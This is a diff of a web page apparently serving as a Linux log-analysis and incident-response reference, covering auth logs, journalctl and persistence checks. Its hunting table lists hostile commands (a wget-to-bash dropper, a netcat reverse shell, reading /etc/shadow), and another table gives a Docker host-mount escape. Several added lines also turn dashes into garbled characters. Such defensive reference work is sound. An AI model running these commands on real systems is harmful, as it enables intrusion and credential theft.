@@ -1,10 +1,10 @@
-<!DOCTYPE html>
+ï»¿<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8"><script>if(location.pathname!=="/"&&location.pathname.endsWith("/"))history.replaceState(null,"",location.pathname.slice(0,-1)+location.search+location.hash);</script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Linux Log Analysis | Ben Thomson</title>
-    <link rel="icon" type="image/png" href="/mouse_t.png">
+    <link rel="icon" type="image/png" href="/logo2.png">
     <link rel="stylesheet" href="/style.css">
     <link rel="stylesheet" href="/writeup.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -38,7 +38,7 @@
                 <span class="writeup-category"><i class="fas fa-tag"></i> Linux / Log Analysis / DFIR</span>
             </div>
             <h1 class="writeup-title">Linux Log Analysis</h1>
-            <p class="writeup-subtitle">A practical reference for investigating Linux systems — covering key log files, authentication events, SSH attacks, privilege escalation indicators, persistence mechanisms, and the commands to find them.</p>
+            <p class="writeup-subtitle">A practical reference for investigating Linux systems ï¿½ covering key log files, authentication events, SSH attacks, privilege escalation indicators, persistence mechanisms, and the commands to find them.</p>
             <div class="writeup-stats">
                 <span><i class="fas fa-clock"></i> 15 min read</span>
                 <span><i class="fas fa-terminal"></i> Command Reference</span>
@@ -80,18 +80,18 @@
                                 <tr><th>File / Path</th><th>Distro</th><th>Contents</th></tr>
                             </thead>
                             <tbody>
-                                <tr><td><code>/var/log/auth.log</code></td><td>Debian / Ubuntu</td><td>All authentication events — SSH logins, sudo usage, PAM, su</td></tr>
+                                <tr><td><code>/var/log/auth.log</code></td><td>Debian / Ubuntu</td><td>All authentication events ï¿½ SSH logins, sudo usage, PAM, su</td></tr>
                                 <tr><td><code>/var/log/secure</code></td><td>RHEL / CentOS / Fedora</td><td>Equivalent to auth.log on Debian systems</td></tr>
-                                <tr><td><code>/var/log/syslog</code></td><td>Debian / Ubuntu</td><td>General system messages — services, kernel, cron, daemons</td></tr>
+                                <tr><td><code>/var/log/syslog</code></td><td>Debian / Ubuntu</td><td>General system messages ï¿½ services, kernel, cron, daemons</td></tr>
                                 <tr><td><code>/var/log/messages</code></td><td>RHEL / CentOS</td><td>Equivalent to syslog on Debian systems</td></tr>
-                                <tr><td><code>/var/log/kern.log</code></td><td>Debian / Ubuntu</td><td>Kernel messages — driver errors, hardware events, module loading</td></tr>
-                                <tr><td><code>/var/log/cron</code> / <code>syslog</code></td><td>Both</td><td>Cron job execution — attacker-added cron jobs for persistence</td></tr>
-                                <tr><td><code>/var/log/wtmp</code></td><td>Both</td><td>Binary — all login/logout sessions. Read with <code>last</code></td></tr>
-                                <tr><td><code>/var/log/btmp</code></td><td>Both</td><td>Binary — failed login attempts. Read with <code>lastb</code></td></tr>
-                                <tr><td><code>/var/log/lastlog</code></td><td>Both</td><td>Binary — last login time per user. Read with <code>lastlog</code></td></tr>
+                                <tr><td><code>/var/log/kern.log</code></td><td>Debian / Ubuntu</td><td>Kernel messages ï¿½ driver errors, hardware events, module loading</td></tr>
+                                <tr><td><code>/var/log/cron</code> / <code>syslog</code></td><td>Both</td><td>Cron job execution ï¿½ attacker-added cron jobs for persistence</td></tr>
+                                <tr><td><code>/var/log/wtmp</code></td><td>Both</td><td>Binary ï¿½ all login/logout sessions. Read with <code>last</code></td></tr>
+                                <tr><td><code>/var/log/btmp</code></td><td>Both</td><td>Binary ï¿½ failed login attempts. Read with <code>lastb</code></td></tr>
+                                <tr><td><code>/var/log/lastlog</code></td><td>Both</td><td>Binary ï¿½ last login time per user. Read with <code>lastlog</code></td></tr>
                                 <tr><td><code>/var/log/apache2/</code> or <code>/var/log/httpd/</code></td><td>Both</td><td>Web server access and error logs</td></tr>
-                                <tr><td><code>/var/log/audit/audit.log</code></td><td>Both (auditd)</td><td>Kernel-level audit events — syscalls, file access, process execution</td></tr>
-                                <tr><td><code>~/.bash_history</code></td><td>Both</td><td>Per-user command history — first place to check on compromise</td></tr>
+                                <tr><td><code>/var/log/audit/audit.log</code></td><td>Both (auditd)</td><td>Kernel-level audit events ï¿½ syscalls, file access, process execution</td></tr>
+                                <tr><td><code>~/.bash_history</code></td><td>Both</td><td>Per-user command history ï¿½ first place to check on compromise</td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -111,14 +111,14 @@
                         <table class="kql-table">
                             <thead><tr><th>Log entry pattern</th><th>What it means</th></tr></thead>
                             <tbody>
-                                <tr><td><code>Failed password for root from 1.2.3.4</code></td><td>SSH brute force against root — check volume and source IP</td></tr>
+                                <tr><td><code>Failed password for root from 1.2.3.4</code></td><td>SSH brute force against root ï¿½ check volume and source IP</td></tr>
                                 <tr><td><code>Failed password for invalid user admin from 1.2.3.4</code></td><td>Username enumeration or credential stuffing</td></tr>
-                                <tr><td><code>Accepted password for ubuntu from 1.2.3.4</code></td><td>Successful password login — note source IP and time</td></tr>
-                                <tr><td><code>Accepted publickey for ubuntu from 1.2.3.4</code></td><td>SSH key login — check if this key was authorised</td></tr>
-                                <tr><td><code>sudo: ben : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash</code></td><td>User escalated to root — note command and user</td></tr>
-                                <tr><td><code>sudo: pam_unix(sudo:auth): authentication failure</code></td><td>Failed sudo attempt — could be credential testing</td></tr>
-                                <tr><td><code>session opened for user root by (uid=0)</code></td><td>Root session started — correlate with prior events</td></tr>
-                                <tr><td><code>useradd: new user: name=backdoor</code></td><td>New account created — common attacker persistence</td></tr>
+                                <tr><td><code>Accepted password for ubuntu from 1.2.3.4</code></td><td>Successful password login ï¿½ note source IP and time</td></tr>
+                                <tr><td><code>Accepted publickey for ubuntu from 1.2.3.4</code></td><td>SSH key login ï¿½ check if this key was authorised</td></tr>
+                                <tr><td><code>sudo: ben : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash</code></td><td>User escalated to root ï¿½ note command and user</td></tr>
+                                <tr><td><code>sudo: pam_unix(sudo:auth): authentication failure</code></td><td>Failed sudo attempt ï¿½ could be credential testing</td></tr>
+                                <tr><td><code>session opened for user root by (uid=0)</code></td><td>Root session started ï¿½ correlate with prior events</td></tr>
+                                <tr><td><code>useradd: new user: name=backdoor</code></td><td>New account created ï¿½ common attacker persistence</td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -159,7 +159,7 @@ grep "useradd\|new user" /var/log/auth.log</code></pre>
                         <div class="concept-card">
                             <div class="concept-icon"><i class="fas fa-exclamation-circle"></i></div>
                             <h4>Kernel Errors</h4>
-                            <p>Kernel module loading (<code>insmod</code>, <code>modprobe</code>) is logged here. Rootkits load as kernel modules — unexpected module loads are a red flag.</p>
+                            <p>Kernel module loading (<code>insmod</code>, <code>modprobe</code>) is logged here. Rootkits load as kernel modules ï¿½ unexpected module loads are a red flag.</p>
                         </div>
                         <div class="concept-card">
                             <div class="concept-icon"><i class="fas fa-network-wired"></i></div>
@@ -171,10 +171,10 @@ grep "useradd\|new user" /var/log/auth.log</code></pre>
 
                 <section id="journald" class="writeup-section">
                     <h2><span class="title-prefix">// </span>journald &amp; journalctl</h2>
-                    <p>On systemd-based systems (most modern Linux), <strong>journald</strong> collects logs from all sources — kernel, services, auth — into a centralised binary journal. Access it with <code>journalctl</code>.</p>
+                    <p>On systemd-based systems (most modern Linux), <strong>journald</strong> collects logs from all sources ï¿½ kernel, services, auth ï¿½ into a centralised binary journal. Access it with <code>journalctl</code>.</p>
 
                     <div class="code-block">
-                        <div class="code-header"><span class="code-lang">Bash — journalctl reference</span></div>
+                        <div class="code-header"><span class="code-lang">Bash ï¿½ journalctl reference</span></div>
                         <pre><code># View all logs, newest first
 journalctl -r
 
@@ -211,12 +211,12 @@ journalctl -o json-pretty --since "1 hour ago"</code></pre>
                         <table class="kql-table">
                             <thead><tr><th>Command</th><th>Source file</th><th>Shows</th></tr></thead>
                             <tbody>
-                                <tr><td><code>last</code></td><td>/var/log/wtmp</td><td>All successful logins — user, terminal, source IP, login/logout time</td></tr>
-                                <tr><td><code>lastb</code></td><td>/var/log/btmp</td><td>Failed login attempts — requires root to read</td></tr>
-                                <tr><td><code>lastlog</code></td><td>/var/log/lastlog</td><td>Most recent login per user — useful for spotting dormant accounts suddenly active</td></tr>
+                                <tr><td><code>last</code></td><td>/var/log/wtmp</td><td>All successful logins ï¿½ user, terminal, source IP, login/logout time</td></tr>
+                                <tr><td><code>lastb</code></td><td>/var/log/btmp</td><td>Failed login attempts ï¿½ requires root to read</td></tr>
+                                <tr><td><code>lastlog</code></td><td>/var/log/lastlog</td><td>Most recent login per user ï¿½ useful for spotting dormant accounts suddenly active</td></tr>
                                 <tr><td><code>w</code></td><td>Kernel / /proc</td><td>Currently logged-in users and what they're running</td></tr>
-                                <tr><td><code>who</code></td><td>/var/run/utmp</td><td>Current sessions — user, terminal, login time, source IP</td></tr>
-                                <tr><td><code>id &lt;user&gt;</code></td><td>N/A</td><td>Groups and UID/GID for a user — check for unexpected group membership</td></tr>
+                                <tr><td><code>who</code></td><td>/var/run/utmp</td><td>Current sessions ï¿½ user, terminal, login time, source IP</td></tr>
+                                <tr><td><code>id &lt;user&gt;</code></td><td>N/A</td><td>Groups and UID/GID for a user ï¿½ check for unexpected group membership</td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -236,11 +236,11 @@ lastlog | grep -v "Never logged in" | sort -k4</code></pre>
 
                 <section id="bashhistory" class="writeup-section">
                     <h2><span class="title-prefix">// </span>Bash History</h2>
-                    <p>The <code>~/.bash_history</code> file records commands run by each user. It's often the first place to look after confirming a host is compromised — even partial history reveals what an attacker ran.</p>
+                    <p>The <code>~/.bash_history</code> file records commands run by each user. It's often the first place to look after confirming a host is compromised ï¿½ even partial history reveals what an attacker ran.</p>
 
                     <div class="callout callout-warning">
                         <i class="fas fa-exclamation-triangle"></i>
-                        <p>History is written to disk when the shell session exits. If an attacker opens a shell, runs commands, then closes it — the commands are logged. However, attackers can prevent this by setting <code>HISTFILE=/dev/null</code>, <code>HISTSIZE=0</code>, running <code>history -c</code>, or starting the session with <code>unset HISTFILE</code>. A user with no history is itself suspicious.</p>
+                        <p>History is written to disk when the shell session exits. If an attacker opens a shell, runs commands, then closes it ï¿½ the commands are logged. However, attackers can prevent this by setting <code>HISTFILE=/dev/null</code>, <code>HISTSIZE=0</code>, running <code>history -c</code>, or starting the session with <code>unset HISTFILE</code>. A user with no history is itself suspicious.</p>
                     </div>
 
                     <h3 class="sub-heading">Suspicious commands to hunt for</h3>
@@ -248,17 +248,17 @@ lastlog | grep -v "Never logged in" | sort -k4</code></pre>
                         <table class="kql-table">
                             <thead><tr><th>Command / pattern</th><th>Why suspicious</th></tr></thead>
                             <tbody>
-                                <tr><td><code>wget http://x.x.x.x/shell.sh | bash</code></td><td>Download and execute — one-line dropper</td></tr>
+                                <tr><td><code>wget http://x.x.x.x/shell.sh | bash</code></td><td>Download and execute ï¿½ one-line dropper</td></tr>
                                 <tr><td><code>curl -s http://... | sh</code></td><td>Same as above via curl</td></tr>
-                                <tr><td><code>chmod +x / chmod 777</code></td><td>Making files executable — typically follows a download</td></tr>
-                                <tr><td><code>python3 -c 'import pty...'</code></td><td>PTY shell stabilisation — common after initial shell</td></tr>
+                                <tr><td><code>chmod +x / chmod 777</code></td><td>Making files executable ï¿½ typically follows a download</td></tr>
+                                <tr><td><code>python3 -c 'import pty...'</code></td><td>PTY shell stabilisation ï¿½ common after initial shell</td></tr>
                                 <tr><td><code>nc -e /bin/bash</code></td><td>Netcat reverse shell</td></tr>
                                 <tr><td><code>cat /etc/shadow</code></td><td>Reading the password hash file</td></tr>
-                                <tr><td><code>crontab -e</code></td><td>Editing crontab — persistence</td></tr>
+                                <tr><td><code>crontab -e</code></td><td>Editing crontab ï¿½ persistence</td></tr>
                                 <tr><td><code>useradd / adduser</code></td><td>Creating new user accounts for persistence</td></tr>
                                 <tr><td><code>ssh-keygen && cat >> ~/.ssh/authorized_keys</code></td><td>Adding SSH key for persistent access</td></tr>
-                                <tr><td><code>find / -perm -4000</code></td><td>Searching for SUID binaries — local privilege escalation</td></tr>
-                                <tr><td><code>sudo -l</code></td><td>Listing allowed sudo commands — attacker profiling permissions</td></tr>
+                                <tr><td><code>find / -perm -4000</code></td><td>Searching for SUID binaries ï¿½ local privilege escalation</td></tr>
+                                <tr><td><code>sudo -l</code></td><td>Listing allowed sudo commands ï¿½ attacker profiling permissions</td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -269,7 +269,7 @@ lastlog | grep -v "Never logged in" | sort -k4</code></pre>
                     <p>SSH is the most commonly attacked remote access service on Linux. Knowing what a brute force vs. a successful compromise looks like in logs is essential.</p>
 
                     <h3 class="sub-heading">Brute force pattern</h3>
-                    <p>Hundreds to thousands of <code>Failed password</code> entries from the same source IP, often targeting common usernames (root, admin, ubuntu, pi). Followed by silence or — if successful — an <code>Accepted password</code> entry.</p>
+                    <p>Hundreds to thousands of <code>Failed password</code> entries from the same source IP, often targeting common usernames (root, admin, ubuntu, pi). Followed by silence or ï¿½ if successful ï¿½ an <code>Accepted password</code> entry.</p>
 
                     <h3 class="sub-heading">Credential stuffing pattern</h3>
                     <p>Attempts across many different usernames from the same source, or attempts from many different IPs to the same account. Distributed brute force avoids per-IP rate limiting.</p>
@@ -281,8 +281,8 @@ lastlog | grep -v "Never logged in" | sort -k4</code></pre>
                             <tbody>
                                 <tr><td>Source IP</td><td>Login from a country or IP range that has never accessed the system</td></tr>
                                 <tr><td>Timing</td><td>Login at unusual hours for the user's normal pattern</td></tr>
-                                <tr><td>Key login after password failures</td><td>Attacker switched to key-based auth after acquiring credentials — may indicate key was also stolen</td></tr>
-                                <tr><td>Multiple sessions</td><td>Same user opens multiple simultaneous sessions — unusual for legitimate users</td></tr>
+                                <tr><td>Key login after password failures</td><td>Attacker switched to key-based auth after acquiring credentials ï¿½ may indicate key was also stolen</td></tr>
+                                <tr><td>Multiple sessions</td><td>Same user opens multiple simultaneous sessions ï¿½ unusual for legitimate users</td></tr>
                                 <tr><td>Immediate privilege escalation</td><td>sudo or su commands within seconds of login</td></tr>
                             </tbody>
                         </table>
@@ -294,7 +294,7 @@ lastlog | grep -v "Never logged in" | sort -k4</code></pre>
 grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
 
 # All unique usernames targeted in brute force
-# Note: "for invalid user" entries shift the field position — use a pattern match instead
+# Note: "for invalid user" entries shift the field position ï¿½ use a pattern match instead
 grep "Failed password" /var/log/auth.log | awk '{for(i=1;i<=NF;i++) if($i=="for"){print $(i+1); break}}' | sort | uniq -c | sort -rn
 
 # Find where a successful login came from
@@ -311,11 +311,11 @@ grep "Accepted" /var/log/auth.log | grep "username"</code></pre>
                             <thead><tr><th>Method</th><th>Log indicator</th><th>Filesystem indicator</th></tr></thead>
                             <tbody>
                                 <tr><td>Sudo misconfiguration</td><td>sudo command executed in auth.log</td><td>Check <code>/etc/sudoers</code> and <code>/etc/sudoers.d/</code> for risky entries like <code>NOPASSWD: /bin/bash</code></td></tr>
-                                <tr><td>SUID binary abuse</td><td>Execution in bash_history / auditd</td><td><code>find / -perm -4000 2>/dev/null</code> — compare against known-good baseline</td></tr>
-                                <tr><td>Writable /etc/passwd</td><td>File modification via auditd</td><td><code>ls -la /etc/passwd</code> — should be 644 root:root</td></tr>
+                                <tr><td>SUID binary abuse</td><td>Execution in bash_history / auditd</td><td><code>find / -perm -4000 2>/dev/null</code> ï¿½ compare against known-good baseline</td></tr>
+                                <tr><td>Writable /etc/passwd</td><td>File modification via auditd</td><td><code>ls -la /etc/passwd</code> ï¿½ should be 644 root:root</td></tr>
                                 <tr><td>Cron as root</td><td>Cron execution in syslog</td><td>Check <code>/etc/cron*</code>, <code>/var/spool/cron</code> for unexpected entries</td></tr>
                                 <tr><td>Kernel exploit</td><td>Kernel panic / oops in kern.log</td><td>Suspicious binaries or compiled code in /tmp</td></tr>
-                                <tr><td>Docker socket abuse</td><td>Docker daemon logs</td><td><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> — mounts host filesystem</td></tr>
+                                <tr><td>Docker socket abuse</td><td>Docker daemon logs</td><td><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> ï¿½ mounts host filesystem</td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -329,13 +329,13 @@ grep "Accepted" /var/log/auth.log | grep "username"</code></pre>
                         <table class="kql-table">
                             <thead><tr><th>Mechanism</th><th>Location to check</th><th>What to look for</th></tr></thead>
                             <tbody>
-                                <tr><td>SSH authorized_keys</td><td><code>~/.ssh/authorized_keys</code></td><td>Unknown public keys — check all user home directories including root</td></tr>
+                                <tr><td>SSH authorized_keys</td><td><code>~/.ssh/authorized_keys</code></td><td>Unknown public keys ï¿½ check all user home directories including root</td></tr>
                                 <tr><td>Cron jobs</td><td><code>/etc/cron*</code>, <code>/var/spool/cron/crontabs/</code></td><td>Unfamiliar entries, especially wget/curl commands, reverse shells</td></tr>
-                                <tr><td>Systemd services</td><td><code>/etc/systemd/system/</code>, <code>/lib/systemd/system/</code></td><td>New or modified service files — check <code>ExecStart</code> for malicious commands</td></tr>
+                                <tr><td>Systemd services</td><td><code>/etc/systemd/system/</code>, <code>/lib/systemd/system/</code></td><td>New or modified service files ï¿½ check <code>ExecStart</code> for malicious commands</td></tr>
                                 <tr><td>Startup scripts</td><td><code>/etc/rc.local</code>, <code>/etc/init.d/</code>, <code>~/.bashrc</code>, <code>~/.profile</code></td><td>Appended commands that execute on login or boot</td></tr>
                                 <tr><td>Backdoor user</td><td><code>/etc/passwd</code>, <code>/etc/shadow</code></td><td>Accounts with UID 0 (root-level), accounts created at unusual times</td></tr>
-                                <tr><td>SUID backdoor</td><td>Filesystem</td><td><code>find / -perm -4000 -newer /etc/passwd</code> — SUID files created after a known date</td></tr>
-                                <tr><td>LD_PRELOAD hijacking</td><td><code>/etc/ld.so.preload</code>, <code>~/.bashrc</code></td><td>Malicious shared library preloaded before all processes — rootkit technique</td></tr>
+                                <tr><td>SUID backdoor</td><td>Filesystem</td><td><code>find / -perm -4000 -newer /etc/passwd</code> ï¿½ SUID files created after a known date</td></tr>
+                                <tr><td>LD_PRELOAD hijacking</td><td><code>/etc/ld.so.preload</code>, <code>~/.bashrc</code></td><td>Malicious shared library preloaded before all processes ï¿½ rootkit technique</td></tr>
                             </tbody>
                         </table>
                     </div>
@@ -346,7 +346,7 @@ grep "Accepted" /var/log/auth.log | grep "username"</code></pre>
                     <p>A quick-reference collection of commands for Linux forensic triage.</p>
 
                     <div class="code-block">
-                        <div class="code-header"><span class="code-lang">Bash — Initial Triage</span></div>
+                        <div class="code-header"><span class="code-lang">Bash ï¿½ Initial Triage</span></div>
                         <pre><code># Who is logged in right now
 w && who
 
@@ -390,7 +390,7 @@ ls -la /proc/*/exe 2>/dev/null | awk '{print $NF}' | sort -u | xargs -I{} sha256
 
                     <div class="callout callout-tip">
                         <i class="fas fa-lightbulb"></i>
-                        <p><strong>Check /tmp, /var/tmp, and /dev/shm first.</strong> These are world-writable directories that attackers commonly use for staging payloads, compiling exploits, and running tooling. Files in these locations are deleted on reboot — check them before any planned restart.</p>
+                        <p><strong>Check /tmp, /var/tmp, and /dev/shm first.</strong> These are world-writable directories that attackers commonly use for staging payloads, compiling exploits, and running tooling. Files in these locations are deleted on reboot ï¿½ check them before any planned restart.</p>
                     </div>
 
                     <div class="callout callout-info">
